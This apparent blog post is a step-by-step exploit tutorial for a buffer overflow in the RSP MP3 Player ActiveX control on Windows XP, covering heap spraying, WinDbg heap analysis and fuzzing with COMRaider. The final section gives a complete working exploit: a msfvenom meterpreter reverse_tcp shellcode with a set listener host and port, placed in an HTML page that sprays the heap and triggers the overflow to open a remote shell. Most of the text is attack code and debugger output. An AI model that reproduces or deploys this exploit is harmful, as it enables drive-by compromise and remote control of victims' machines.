---
layout:     post
title:      RSP MP3 Player - OCX ActiveX Buffer Overflow
author:     wooy0ung
tags:       heapspray
category:   exploit
---

>[Analysis Environment]  
>guest machine: Windows XP sp3  
>host machine: Windows 10  
>vulnerability application: RSP MP3 Player 3.2.0  
>necessary tools: [[Utilu IE Collection 1.7.2.1]](http://utilu.com/IECollection/)、[[COMRaider]](https://github.com/dzzie/COMRaider)、Windbg  
<!-- more -->


## 0x001 Introduction

Test this script.
```
<html>
<body>
<script language='javascript'>
 
    var name = unescape('%u6f77%u796f%u7530%u676e');
    alert("allocation done");
 
</script>
</body>
</html>
```

Obviously, I placed a ASCII string "wooy0ung" on the heap. Please use unescape method, because I want to allocate ASCII string.
```
0:009> s -a 0x00000000 L? 7fffffff "wooy0ung"
001b69b8  77 6f 6f 79 30 75 6e 67-2d 31 38 37 35 61 37 00  wooy0ung-1875a7.
001b8014  77 6f 6f 79 30 75 6e 67-00 00 00 00 f4 8e 53 e8  wooy0ung......S.
0:009> d 001b8014
001b8014  77 6f 6f 79 30 75 6e 67-00 00 00 00 f4 8e 53 e8  wooy0ung......S.
001b8024  7a 01 0c ff c0 47 1b 00-90 4a 1b 00 60 44 1b 00  z....G...J..`D..
001b8034  00 00 01 00 f7 8e 53 e8-00 01 0c ff 04 00 00 00  ......S.........
001b8044  c8 a6 23 03 00 00 00 00-8c 60 1c 03 fa 8e 53 e8  ..#......`....S.
001b8054  00 01 08 ff 90 4a 1b 00-90 44 1b 00 00 47 1b 00  .....J...D...G..
001b8064  60 44 1b 00 fd 8e 53 e8-00 01 08 ff 0c 00 00 00  `D....S.........
001b8074  58 dc 1e 00 14 00 00 00-00 20 00 00 e0 8e 53 e8  X........ ....S.
001b8084  3f 01 0c ff 2e 00 68 00-74 00 6d 00 6c 00 00 00  ?.....h.t.m.l...
```

Now, I want to place with "shellcode". I Suppose it's size does not exceed 1000 bytes.
```
<html>
<body>
<script language='javascript'>

	size = 0x3E8;  // 1000 bytes
	NopSlide = '';

	var name = unescape('%u6f77%u796f%u7530%u676e');

	for (c = 0; c < size; c++){ 
		NopSlide += unescape('%u9090%u9090');
	}
	NopSlide = NopSlide.substring(0,size - Shellcode.length);

	var memory = new Array();
	for(i = 0; i < 50; i++){
		memory[i] = NopSlide + Shellcode;
	}
    alert("allocation done");
  
</script>
</body>
</html>
```

Find out the specified ASCII strings on our heap.
```
0:014> s -a 0x00000000 L? 7fffffff "wooy0ung"
001bec80  77 6f 6f 79 30 75 6e 67-2d 31 38 37 35 61 37 00  wooy0ung-1875a7.
0323202c  77 6f 6f 79 30 75 6e 67-00 00 90 90 90 90 90 90  wooy0ung........
0323e08c  77 6f 6f 79 30 75 6e 67-00 00 90 90 90 90 90 90  wooy0ung........
032561ec  77 6f 6f 79 30 75 6e 67-00 00 90 90 90 90 90 90  wooy0ung........
032a82f4  77 6f 6f 79 30 75 6e 67-00 00 90 90 90 90 90 90  wooy0ung........
032a92fc  77 6f 6f 79 30 75 6e 67-00 00 90 90 90 90 90 90  wooy0ung........
032aa304  77 6f 6f 79 30 75 6e 67-00 00 90 90 90 90 90 90  wooy0ung........
032ab30c  77 6f 6f 79 30 75 6e 67-00 00 90 90 90 90 90 90  wooy0ung........
032ac314  77 6f 6f 79 30 75 6e 67-00 00 90 90 90 90 90 90  wooy0ung........
......
```

As you see, allocation is not perfect.
```
0:014> d 0323202c-20
0323200c  90 90 90 90 90 90 90 90-90 90 90 90 90 90 90 90  ................
0323201c  90 90 90 90 90 90 90 90-90 90 90 90 90 90 90 90  ................
0323202c  77 6f 6f 79 30 75 6e 67-00 00 90 90 90 90 90 90  wooy0ung........
0323203c  90 90 90 90 90 90 90 90-90 90 90 90 90 90 90 90  ................
0323204c  90 90 90 90 90 90 90 90-90 90 90 90 90 90 90 90  ................
0323205c  90 90 90 90 90 90 90 90-90 90 90 90 90 90 90 90  ................
0323206c  90 90 90 90 90 90 90 90-90 90 90 90 90 90 90 90  ................
0323207c  90 90 90 90 90 90 90 90-90 90 90 90 90 90 90 90  ................
0:014> d 0323e08c-20
0323e06c  90 90 90 90 90 90 90 90-90 90 90 90 90 90 90 90  ................
0323e07c  90 90 90 90 90 90 90 90-90 90 90 90 90 90 90 90  ................
0323e08c  77 6f 6f 79 30 75 6e 67-00 00 90 90 90 90 90 90  wooy0ung........
0323e09c  90 90 90 90 90 90 90 90-90 90 90 90 90 90 90 90  ................
0323e0ac  90 90 90 90 90 90 90 90-90 90 90 90 90 90 90 90  ................
0323e0bc  90 90 90 90 90 90 90 90-90 90 90 90 90 90 90 90  ................
0323e0cc  90 90 90 90 90 90 90 90-90 90 90 90 90 90 90 90  ................
0323e0dc  90 90 90 90 90 90 90 90-90 90 90 90 90 90 90 90  ................
0:014> d 032dec4c-20
032dec2c  90 90 90 90 90 90 90 90-90 90 90 90 90 90 90 90  ................
032dec3c  90 90 90 90 90 90 90 90-90 90 90 90 90 90 90 90  ................
032dec4c  77 6f 6f 79 30 75 6e 67-00 00 90 90 90 90 90 90  wooy0ung........
032dec5c  90 90 90 90 90 90 90 90-90 90 90 90 90 90 90 90  ................
032dec6c  90 90 90 90 90 90 90 90-90 90 90 90 90 90 90 90  ................
032dec7c  90 90 90 90 c0 fc fa e9-90 01 28 ff d0 07 00 00  ..........(.....
032dec8c  90 90 90 90 90 90 90 90-90 90 90 90 90 90 90 90  ................
032dec9c  90 90 90 90 90 90 90 90-90 90 90 90 90 90 90 90  ................
0:014> d 0332511c-20
033250fc  90 90 90 90 90 90 90 90-90 90 90 90 90 90 90 90  ................
0332510c  90 90 90 90 90 90 90 90-90 90 90 90 90 90 90 90  ................
0332511c  77 6f 6f 79 30 75 6e 67-00 00 90 90 90 90 90 90  wooy0ung........
0332512c  90 90 90 90 90 90 90 90-90 90 90 90 90 90 90 90  ................
0332513c  90 90 90 90 90 90 90 90-90 90 90 90 90 90 90 90  ................
0332514c  90 90 90 90 f2 16 f9 e9-90 01 28 ff d0 07 00 00  ..........(.....
0332515c  90 90 90 90 90 90 90 90-90 90 90 90 90 90 90 90  ................
0332516c  90 90 90 90 90 90 90 90-90 90 90 90 90 90 90 90  ................
```

This script sprays much larger blocks 0x40000 (= 262144 bytes = 0.25 mb) and repeats these blocks 500 times (= 125 mb heap spray)
```
<html>
<body>
<script language='javascript'>

	var Shellcode = unescape('%u6f77%u796f%u7530%u676e');

	var NopSlide = unescape('%u9090%u9090');

	var headersize = 20;
	var slack = headersize + Shellcode.length;

	while(NopSlide.length < slack) NopSlide += NopSlide;
	var filler = NopSlide.substring(0,slack);
	var chunk = NopSlide.substring(0,NopSlide.length - slack);

	while(chunk.length + slack < 0x40000) chunk = chunk + filler;
	var memory = new Array();
	for(i = 0;i<500;i++){ memory[i] = chunk + Shellcode; }

	alert("allocation done");

</script>
</body>
</html>
```

Now, our blocks are comprised of about 99.997% NOP's which makes jumping to them extremely reliable!
```
0:014> s -a 0x00000000 L? 7fffffff "wooy0ung"
169c0014  77 6f 6f 79 30 75 6e 67-00 00 00 00 00 00 00 00  wooy0ung........
16a50014  77 6f 6f 79 30 75 6e 67-00 00 00 00 00 00 00 00  wooy0ung........
16ae0014  77 6f 6f 79 30 75 6e 67-00 00 00 00 00 00 00 00  wooy0ung........
16b70014  77 6f 6f 79 30 75 6e 67-00 00 00 00 00 00 00 00  wooy0ung........
16c00014  77 6f 6f 79 30 75 6e 67-00 00 00 00 00 00 00 00  wooy0ung........
16c90014  77 6f 6f 79 30 75 6e 67-00 00 00 00 00 00 00 00  wooy0ung........
16d20014  77 6f 6f 79 30 75 6e 67-00 00 00 00 00 00 00 00  wooy0ung........
16db0014  77 6f 6f 79 30 75 6e 67-00 00 00 00 00 00 00 00  wooy0ung........
16e40014  77 6f 6f 79 30 75 6e 67-00 00 00 00 00 00 00 00  wooy0ung........
......
```

Looking at the process environment block (PEB) will tell us what the default 
ProcessHeap is.
```
0:014> !peb
PEB at 7ffda000
*************************************************************************
***                                                                   ***
***                                                                   ***
***    Your debugger is not using the correct symbols                 ***
***                                                                   ***
***    In order for this command to work properly, your symbol path   ***
***    must point to .pdb files that have full type information.      ***
***                                                                   ***
***    Certain .pdb files (such as the public OS symbols) do not      ***
***    contain the required information.  Contact the group that      ***
***    provided you with these symbols if you need this command to    ***
***    work.                                                          ***
***                                                                   ***
***    Type referenced: ntdll!_PEB                                    ***
***                                                                   ***
*************************************************************************
error 3 InitTypeRead( nt!_PEB at 7ffda000)...
```
Oh! I don't have the symbols files. Fix it~

mkdir C:\toolchain\windows\symbols, and select "File --> Symbol File Path ...", Add this item!
![](/assets/img/exploit/2018-08-15-rsp-mp3-player-ocx-activex-buffer-overflow/0x001.png)
```
SRV*C:\toolchain\windows\symbols*http://msdl.microsoft.com/download/symbols
```

Unluckily! It seems that this symbols file no longer avilable.
```
0:014> .reload
Reloading current modules
................................................................
...................
*** ERROR: Symbol file could not be found.  Defaulted to export symbols for C:\WINDOWS\system32\ntdll.dll - 
```

You can download from the website by yourself & install.
[Window xp sp3 调试符号（symbols）完整包](https://download.csdn.net/download/aasmfox/5471219)
Don't forget to add the path of symbol files!

Look at PEB structure again.
```
0:014> !peb
PEB at 7ffda000
    InheritedAddressSpace:    No
    ReadImageFileExecOptions: No
    BeingDebugged:            Yes
    ImageBaseAddress:         00400000
    Ldr                       00241e90
    Ldr.Initialized:          Yes
    Ldr.InInitializationOrderModuleList: 00241f28 . 00245688
    Ldr.InLoadOrderModuleList:           00241ec0 . 002456d0
    Ldr.InMemoryOrderModuleList:         00241ec8 . 002456d8
            Base TimeStamp                     Module
          400000 46c108d9 Aug 14 09:43:53 2007 C:\toolchain\windows\Utilu IE Collection\IE700\iexplore.exe
        7c920000 4802bdc5 Apr 14 10:13:25 2008 C:\WINDOWS\system32\ntdll.dll
        7c800000 4802bdc6 Apr 14 10:13:26 2008 C:\WINDOWS\system32\kernel32.dll
        77da0000 4802bd89 Apr 14 10:12:25 2008 C:\WINDOWS\system32\ADVAPI32.dll
......
    SubSystemData:     00000000
    ProcessHeap:       00140000
    ProcessParameters: 00020000
    WindowTitle:  'C:\toolchain\windows\Utilu IE Collection\IE700\iexplore.exe'
    ImageFile:    'C:\toolchain\windows\Utilu IE Collection\IE700\iexplore.exe'
    CommandLine:  'about:home'
......
```

Lets print out allocation statistics for this heap specifically. We can see that 98.46% of the busy blocks in this heap belong to our spray.
```
0:014> !heap -stat -h 00140000
 heap @ 00140000
group-by: TOTSIZE max-display: 20
    size     #blocks     total     ( %) (percent of total busy bytes)
    80000 1f5 - fa80000  (98.46)
    3fff8 4 - fffe0  (0.39)
    fff8 b - affa8  (0.27)
    1fff8 4 - 7ffe0  (0.20)
    7ff8 f - 77f88  (0.18)
    1ff8 21 - 41ef8  (0.10)
    3ff8 b - 2bfa8  (0.07)
    8fc1 2 - 11f82  (0.03)
    7fd0 2 - ffa0  (0.02)
    ff8 b - afa8  (0.02)
    8000 1 - 8000  (0.01)
    7ff0 1 - 7ff0  (0.01)
    7fe0 1 - 7fe0  (0.01)
    7db4 1 - 7db4  (0.01)
    614 14 - 7990  (0.01)
    7f8 e - 6f90  (0.01)
    56f8 1 - 56f8  (0.01)
    20 298 - 5300  (0.01)
    52ac 1 - 52ac  (0.01)
    4fe4 1 - 4fe4  (0.01)
```

We can also list all blocks that have the same size (in our case 0x80000)
```
0:014> !heap -flt s 80000
    _HEAP @ 140000
      HEAP_ENTRY Size Prev Flags    UserPtr UserSize - state
        05780018 10000 0000  [0b]   05780020    80000 - (busy VirtualAlloc)
          ? <Unloaded_Ed20.dll>+7ffef
        05810018 10000 0000  [0b]   05810020    80000 - (busy VirtualAlloc)
          ? <Unloaded_Ed20.dll>+7fff7
        056f0018 10000 0000  [0b]   056f0020    80000 - (busy VirtualAlloc)
          ? <Unloaded_Ed20.dll>+7fff7
        058a0018 10000 0000  [0b]   058a0020    80000 - (busy VirtualAlloc)
          ? <Unloaded_Ed20.dll>+7fff7
        05930018 10000 0000  [0b]   05930020    80000 - (busy VirtualAlloc)
          ? <Unloaded_Ed20.dll>+7fff7
        059c0018 10000 0000  [0b]   059c0020    80000 - (busy VirtualAlloc)
          ? <Unloaded_Ed20.dll>+7fff7
        05a50018 10000 0000  [0b]   05a50020    80000 - (busy VirtualAlloc)
          ? <Unloaded_Ed20.dll>+7fff7
        05ae0018 10000 0000  [0b]   05ae0020    80000 - (busy VirtualAlloc)
          ? <Unloaded_Ed20.dll>+7fff7
        05b70018 10000 0000  [0b]   05b70020    80000 - (busy VirtualAlloc)
          ? <Unloaded_Ed20.dll>+7fff7
        05c00018 10000 0000  [0b]   05c00020    80000 - (busy VirtualAlloc)
          ? <Unloaded_Ed20.dll>+7fff7
        05c90018 10000 0000  [0b]   05c90020    80000 - (busy VirtualAlloc)
          ? <Unloaded_Ed20.dll>+7fff7
        05d20018 10000 0000  [0b]   05d20020    80000 - (busy VirtualAlloc)
          ? <Unloaded_Ed20.dll>+7fff7
        05db0018 10000 0000  [0b]   05db0020    80000 - (busy VirtualAlloc)
          ? <Unloaded_Ed20.dll>+7fff7
......
        0bf00018 10000 0000  [0b]   0bf00020    80000 - (busy VirtualAlloc)
          ? <Unloaded_Ed20.dll>+7fff7
        0bf90018 10000 0000  [0b]   0bf90020    80000 - (busy VirtualAlloc)
          ? <Unloaded_Ed20.dll>+7fff7
        0c020018 10000 0000  [0b]   0c020020    80000 - (busy VirtualAlloc)
          ? <Unloaded_Ed20.dll>+7fff7
        0c0b0018 10000 0000  [0b]   0c0b0020    80000 - (busy VirtualAlloc)
          ? <Unloaded_Ed20.dll>+7fff7
        0c140018 10000 0000  [0b]   0c140020    80000 - (busy VirtualAlloc)
          ? <Unloaded_Ed20.dll>+7fff7
......
```

Now, our heap is full of "nop + shellcode". Under normal circumstances, 0x0C0C0C0C is a good target for us to jump into.
```
0:014> d 04040404
04040404  90 90 90 90 90 90 90 90-90 90 90 90 90 90 90 90  ................
04040414  90 90 90 90 90 90 90 90-90 90 90 90 90 90 90 90  ................
04040424  90 90 90 90 90 90 90 90-90 90 90 90 90 90 90 90  ................
04040434  90 90 90 90 90 90 90 90-90 90 90 90 90 90 90 90  ................
04040444  90 90 90 90 90 90 90 90-90 90 90 90 90 90 90 90  ................
04040454  90 90 90 90 90 90 90 90-90 90 90 90 90 90 90 90  ................
04040464  90 90 90 90 90 90 90 90-90 90 90 90 90 90 90 90  ................
04040474  90 90 90 90 90 90 90 90-90 90 90 90 90 90 90 90  ................
0:014> d 05050505
05050505  90 90 90 90 90 90 90 90-90 90 90 90 90 90 90 90  ................
05050515  90 90 90 90 90 90 90 90-90 90 90 90 90 90 90 90  ................
05050525  90 90 90 90 90 90 90 90-90 90 90 90 90 90 90 90  ................
05050535  90 90 90 90 90 90 90 90-90 90 90 90 90 90 90 90  ................
05050545  90 90 90 90 90 90 90 90-90 90 90 90 90 90 90 90  ................
05050555  90 90 90 90 90 90 90 90-90 90 90 90 90 90 90 90  ................
05050565  90 90 90 90 90 90 90 90-90 90 90 90 90 90 90 90  ................
05050575  90 90 90 90 90 90 90 90-90 90 90 90 90 90 90 90  ................
0:014> d 06060606
06060606  90 90 90 90 90 90 90 90-90 90 90 90 90 90 90 90  ................
06060616  90 90 90 90 90 90 90 90-90 90 90 90 90 90 90 90  ................
06060626  90 90 90 90 90 90 90 90-90 90 90 90 90 90 90 90  ................
06060636  90 90 90 90 90 90 90 90-90 90 90 90 90 90 90 90  ................
06060646  90 90 90 90 90 90 90 90-90 90 90 90 90 90 90 90  ................
06060656  90 90 90 90 90 90 90 90-90 90 90 90 90 90 90 90  ................
06060666  90 90 90 90 90 90 90 90-90 90 90 90 90 90 90 90  ................
06060676  90 90 90 90 90 90 90 90-90 90 90 90 90 90 90 90  ................
```


## 0x002 Test POC

Open cmd window, and enter the command below to register ocx module. 
```
regsvr32 rspmp3ocx320sw.ocx
```
![](/assets/img/exploit/2018-08-15-rsp-mp3-player-ocx-activex-buffer-overflow/0x002.png)

COMRaider is a crude but effective ActiveX fuzzer which is easy to use and provides you with test cases for the crashes (albeit in vbscript).

Let's try to fuzz the ocx module.

Don't try to fuzz a file on a Chinese path
![](/assets/img/exploit/2018-08-15-rsp-mp3-player-ocx-activex-buffer-overflow/0x003.png)
![](/assets/img/exploit/2018-08-15-rsp-mp3-player-ocx-activex-buffer-overflow/0x004.png)

Well, there are 14 Exceptions.
![](/assets/img/exploit/2018-08-15-rsp-mp3-player-ocx-activex-buffer-overflow/0x005.png)

Open one of the crash samples.
```
<?XML version='1.0' standalone='yes' ?>
<package><job id='DoneInVBS' debug='false' error='true'>
<object classid='clsid:3C88113F-8CEC-48DC-A0E5-983EF9458687' id='target' />
<script language='vbscript'>

'File Generated by COMRaider v0.0.134 - http://labs.idefense.com

'Wscript.echo typename(target)

'for debugging/custom prolog
targetFile = "C:\workspace\rspmp3\rspmp3ocx320sw.ocx"
prototype  = "Function OpenFile ( ByVal Inputfile As String )"
memberName = "OpenFile"
progid     = "RSPMP3_320.RSPMP3"
argCount   = 1

arg1=String(1044, "A")

target.OpenFile arg1 

</script></job></package>
```

After a bit of sleuthing and converting the vbscript to javascrip I came up with the html below that will trigger the crash. We gain control over EIP through the Structured Exception Handler.
```
<html>
  <head>
    <object id="rsp" classid='clsid:3C88113F-8CEC-48DC-A0E5-983EF9458687'></object>
  </head>
  <body>
  <script>
     
    pointer='';
    for (counter=0; counter<=1000; counter++) pointer+=unescape("%41");
    rsp.OpenFile(pointer);
     
  </script>
</body>
</html>
```
![](/assets/img/exploit/2018-08-15-rsp-mp3-player-ocx-activex-buffer-overflow/0x006.png)


## 0x003 Exploit it!

Generate paylaod by msf.
```
λ msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.0.195 LPORT=9000 -f js_le
[-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload
[-] No arch selected, selecting arch: x86 from the payload
No encoder or badchars specified, outputting raw payload
Payload size: 341 bytes
Final size of js_le file: 1026 bytes
%ue8fc%u0082%u0000%u8960%u31e5%u64c0%u508b%u8b30%u0c52%u528b%u8b14%u2872%ub70f%u264a%uff31%u3cac%u7c61%u2c02%uc120%u0dcf%uc701%uf2e2%u5752%u528b%u8b10%u3c4a%u4c8b%u7811%u48e3%ud101%u8b51%u2059%ud301%u498b%ue318%u493a%u348b%u018b%u31d6%uacff%ucfc1%u010d%u38c7%u75e0%u03f6%uf87d%u7d3b%u7524%u58e4%u588b%u0124%u66d3%u0c8b%u8b4b%u1c58%ud301%u048b%u018b%u89d0%u2444%u5b24%u615b%u5a59%uff51%u5fe0%u5a5f%u128b%u8deb%u685d%u3233%u0000%u7768%u3273%u545f%u4c68%u2677%u8907%uffe8%ub8d0%u0190%u0000%uc429%u5054%u2968%u6b80%uff00%u6ad5%u680a%ua8c0%uc300%u0268%u2300%u8928%u50e6%u5050%u4050%u4050%u6850%u0fea%ue0df%ud5ff%u6a97%u5610%u6857%ua599%u6174%ud5ff%uc085%u0a74%u4eff%u7508%ue8ec%u0067%u0000%u006a%u046a%u5756%u0268%uc8d9%uff5f%u83d5%u00f8%u367e%u368b%u406a%u0068%u0010%u5600%u006a%u5868%u53a4%uffe5%u93d5%u6a53%u5600%u5753%u0268%uc8d9%uff5f%u83d5%u00f8%u287d%u6858%u4000%u0000%u006a%u6850%u2f0b%u300f%ud5ff%u6857%u6e75%u614d%ud5ff%u5e5e%u0cff%u0f24%u7085%uffff%ue9ff%uff9b%uffff%uc301%uc629%uc175%ubbc3%ub5f0%u56a2%u006a%uff53%u41d5
```

Win~
```
<html>
<head>
	<object id="rsp" classid='clsid:3C88113F-8CEC-48DC-A0E5-983EF9458687'></object>
</head>
<body>
<script language='javascript'>

	var Shellcode = unescape('%ue8fc%u0082%u0000%u8960%u31e5%u64c0%u508b%u8b30%u0c52%u528b%u8b14%u2872%ub70f%u264a%uff31%u3cac%u7c61%u2c02%uc120%u0dcf%uc701%uf2e2%u5752%u528b%u8b10%u3c4a%u4c8b%u7811%u48e3%ud101%u8b51%u2059%ud301%u498b%ue318%u493a%u348b%u018b%u31d6%uacff%ucfc1%u010d%u38c7%u75e0%u03f6%uf87d%u7d3b%u7524%u58e4%u588b%u0124%u66d3%u0c8b%u8b4b%u1c58%ud301%u048b%u018b%u89d0%u2444%u5b24%u615b%u5a59%uff51%u5fe0%u5a5f%u128b%u8deb%u685d%u3233%u0000%u7768%u3273%u545f%u4c68%u2677%u8907%uffe8%ub8d0%u0190%u0000%uc429%u5054%u2968%u6b80%uff00%u6ad5%u680a%ua8c0%uc300%u0268%u2300%u8928%u50e6%u5050%u4050%u4050%u6850%u0fea%ue0df%ud5ff%u6a97%u5610%u6857%ua599%u6174%ud5ff%uc085%u0a74%u4eff%u7508%ue8ec%u0067%u0000%u006a%u046a%u5756%u0268%uc8d9%uff5f%u83d5%u00f8%u367e%u368b%u406a%u0068%u0010%u5600%u006a%u5868%u53a4%uffe5%u93d5%u6a53%u5600%u5753%u0268%uc8d9%uff5f%u83d5%u00f8%u287d%u6858%u4000%u0000%u006a%u6850%u2f0b%u300f%ud5ff%u6857%u6e75%u614d%ud5ff%u5e5e%u0cff%u0f24%u7085%uffff%ue9ff%uff9b%uffff%uc301%uc629%uc175%ubbc3%ub5f0%u56a2%u006a%uff53%u41d5');

	var NopSlide = unescape('%u9090%u9090');

	var headersize = 20;
	var slack = headersize + Shellcode.length;

	while(NopSlide.length < slack) NopSlide += NopSlide;
	var filler = NopSlide.substring(0,slack);
	var chunk = NopSlide.substring(0,NopSlide.length - slack);

	while(chunk.length + slack < 0x40000) chunk = chunk + filler;
	var memory = new Array();
	for(i = 0;i<500;i++){ memory[i] = chunk + Shellcode; }

	// Trigger
	pointer = ''
	for(counter=0;counter<=1000;counter++) pointer+=unescape("%0C");
	rsp.OpenFile(pointer);

</script>
</body>
</html>
```
![](/assets/img/exploit/2018-08-15-rsp-mp3-player-ocx-activex-buffer-overflow/0x007.png)
![](/assets/img/exploit/2018-08-15-rsp-mp3-player-ocx-activex-buffer-overflow/0x008.png)